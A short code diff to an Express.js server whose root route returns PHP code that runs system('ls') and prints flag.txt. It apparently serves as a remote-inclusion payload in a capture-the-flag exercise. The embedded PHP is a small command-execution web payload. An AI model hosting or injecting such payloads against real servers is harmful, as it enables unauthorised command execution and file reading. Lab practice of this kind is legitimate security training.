@@ -10,17 +10,16 @@ app.use(cors());
 
 app.get('/', (req, res, next)=>{
     
-    // res.set({
-    //     'Content-Type': 'text/html',
-    // })
     console.log(req.ip+req.url);
     res.status(200);
-    res.send(`texto plano | 
-        <?php echo '<pre>';
+    res.send(` 
+        <?php 
+            echo '<pre>';
+            system('ls');
+            echo base64_decode(file_get_contents('flag.txt')); 
+            echo '</pre>';
+        ?>`);
 
-        system("ls");
-        system("cat flag.txt");
-        echo "<pre>"; ?>`);
 })
 
 app.listen(port, () => {
